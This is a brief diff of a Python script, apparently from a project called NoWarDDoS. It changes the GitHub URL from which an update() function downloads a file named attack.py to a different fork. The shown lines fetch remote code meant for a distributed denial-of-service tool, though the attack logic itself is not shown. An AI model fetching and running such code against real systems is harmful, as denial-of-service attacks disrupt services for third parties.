@@ -6,7 +6,7 @@ import requests
 threads = int(sys.argv[1])
 
 def update():
-    url = "https://raw.githubusercontent.com/AlexTrushkovsky/NoWarDDoS/main/attack.py"
+    url = "https://raw.githubusercontent.com/faddey-w/NoWarDDoS/main/attack.py"
 
     filename = url.split('/')[-1].replace(" ", "_")  # be careful with file names
     file_path = os.path.join('', filename)
